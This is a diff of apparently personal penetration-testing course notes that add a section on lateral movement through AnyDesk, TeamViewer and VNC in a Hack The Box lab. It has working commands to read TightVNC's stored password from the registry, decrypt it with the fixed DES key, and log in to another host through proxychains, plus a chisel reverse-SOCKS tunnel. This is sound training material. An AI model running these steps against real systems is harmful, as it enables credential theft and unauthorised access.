@@ -170,7 +170,7 @@ d41y@htb[/htb]$ ./chisel server --reverse
 Then, in SRV01, you will connect to the server with the following command: `chisel.exe client <VPN IP> R:socks`
 
 ```powershell
-PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
+	PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
 2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
 2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
 ```
@@ -1850,4 +1850,112 @@ Microsoft Windows [Version 10.0.17763.2628]
 
 inlanefreight\helen@SRV01 C:\Users\helen>
 ```
+
+## Remote Management Tools
+
+Remote management tools like AnyDesk, TeamViewer, and VNC are widely used by organizations to provide remote support, access, and administration of systems. These tools are favored for their ease of use, cross-platform compatibility, and robust feature sets that facilitate remote control, file transfer, and system management. While they are invaluable for legitimate administrative tasks, they can also be leveraged for lateral movement during pentesting or by malicious actors.
+
+### Introduction to AnyDesk and TeamViewer
+
+AnyDesk and TeamViever are widely-used remote desktop applications that enable users to access and control computers remotely. These tools are prevalent in corporate environments, where they are utilized for providing IT support, enabling remote work, and managing systems without requiring physical presece. Features such as screen sharing, file transfer, and remote printing make these applications versatile and convenient for legitimate remote administration.
+
+Adversaries may exploit legitimate desktop support and remote access software like AnyDesk and TeamViewer to establish an interactive command and control channel to target systems within networks. These services, along with other remote monitoring and management tools such as VNC, ScreenConnect, LogMeln, and AmmyyAdmin, are often used post-compromise as alternative communication channels or to maintain persistent access. According to the MITRE ATT&CK framework, these tools can be used to establish remote desktop sessions with target systems, facilitate the transfer of tools between systems, and as components of malware to establish reverse connections or back-connect to adversary-controlled systems. Notable examples include the use of AnyDesk by the Cobalt Group for remote access and persistence, and the abuse of TeamViever by the Carbanak group for remote interactive command and control.
+
+### VNC (_Virtual Network Computing_)
+
+VNC is a remote access tool that enables users to control a computer over a network connection. Utilizing the Remote Frame Buffer (_RFB_) protocol, VNC transmits keyboard and mouse events from one computer to another while relaying graphical screen updates back in the other direction. This facilitates real-time interaction with remote systems.
+
+VNC is commonly deployed in enterprise environments to provide technical support and remote work solutions. It allows administrators and technical support staff to assist users without the need to physically visit their workstations, streamlinig the resolution of emergencies or technical issues. VNC is lightweight, platform-independent, and supports a wide range of OS, making it suitable for various network configurations.
+
+According to [MITRE ATT&CK T1021.005](https://attack.mitre.org/techniques/T1021/005/), adversaries may use VNC for lateral movement within a network. VNC allows remote desktop sharing over the network, enabling attackers to control and interact with the compromised systems as if they were physically present. By exploiting VNC, attackers can move laterally across the network, execute commands, transfer files, and escalate privileges.
+
+To leverage VNC for lateral movement, you can use VNC clients and servers to establish remote connections and control target systems.
+
+#### Lateral Movement from Windows using TightVNC
+
+To perform lateral movement using TightVNC from a Windows machine, you need to identify the target system's VNC server details and use a VNC client to connect. By default VNC runs on port 5900. Use PowerShell's `Test-NetConnection` cmdlet to identify if VNC is running on SRV02:
+
+```powershell
+PS C:\Tools> Test-NetConnection -ComputerName SRV02 -Port 5900
+
+ComputerName     : SRV02
+RemoteAddress    : 172.20.0.52
+RemotePort       : 5900
+InterfaceAlias   : Ethernet1
+SourceAddress    : 172.20.0.51
+TcpTestSucceeded : True
+```
+
+To use VNC, you need credentials. Administrators often use shared passwords across multiple computers to facilitate VNC administration. If you gain administrative rights on a computer with VNC installed, you can retrieve the password from the registry keys if it is not encrypted and use it if configured on other machines.
+
+You can use the repo [PasswordDecrypts](https://github.com/frizb/PasswordDecrypts) to search for the registry keys that common VNC software uses. In your case you will search for TightVNC registry keys and find the key `Password`. Connect to SRV02 where you have administrative rights using Helen credentials.
+
+```powershell
+PS C:\Tools> reg query HKLM\SOFTWARE\TightVNC\Server /s
+
+HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
+    ExtraPorts    REG_SZ
+    QueryTimeout    REG_DWORD    0x1e
+    QueryAcceptOnTimeout    REG_DWORD    0x0
+    LocalInputPriorityTimeout    REG_DWORD    0x3
+    LocalInputPriority    REG_DWORD    0x0
+    BlockRemoteInput    REG_DWORD    0x0
+    BlockLocalInput    REG_DWORD    0x0
+    IpAccessControl    REG_SZ
+    RfbPort    REG_DWORD    0x170c
+    HttpPort    REG_DWORD    0x16a8
+    Password    REG_BINARY    816ECB5CE758EAAA
+```
+
+The password key is `816ECB5CE758EAAA`. To obtain the plaintext credentials, you can use Metasploit Framework and the ruby shell, or native Linux tools such as `xxd`, `openssl` and `hexdump`.
+
+```bash
+d41y@htb[/htb]$ echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+00000000  56 4e 43 50 61 33 22 11                           |VNCFake1|
+00000008
+```
+
+Now that you have extracted the credentials, you can attempt to use those credentials on a remote machine. Open TightVNC Viewer and set the remote host to the target machine.
+
+![windows lateral movement 10](../../../images/windows_lateral_movement10.png)
+
+If you are lucky, you might find a privileged account logged into the server:
+
+![windows lateral movement 11](../../../images/windows_lateral_movement11.png)
+
+#### Lateral Movement from Linux using TightVNC
+
+To perform lateral movement using TightVNC from a Linux machine, you will install `xtightvncviewer`, though any other compatible software can be used:
+
+```bash
+d41y@htb[/htb]$ sudo apt-get install xtightvncviewer
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  tightvncpasswd
+...SNIP...
+```
+
+To connect to the VNC server, you need to specify the IP address and the password. Note that to set the password from the command line, you use the option `-autopass` and pipe the password to the `vncviewer` application:
+
+```bash
+d41y@htb[/htb]$ echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass 
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Authentication successful
+Desktop name "srv02"
+...SNIP...
+```
+
+In this example, the command connects to the VNC server running on `172.20.0.52`, using the password `VNCFake1`. The connection process includes enabling the TightVNC protocol extensions and performing standard VNC authentication. Once authenticated successfully, you can interact with the desktop environment of the remote machine as if you were physically present.
+
+In case you are using a slow connection you can also add the following command:
+
+```bash
+d41y@htb[/htb]$ echo VNCFake1 | proxychains4 -q vncviewer 172.20.0.52 -autopass -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
+```
+
+Finally, you can use `F8` to interact with the remote machine, which will give you a prompt with different options.
 
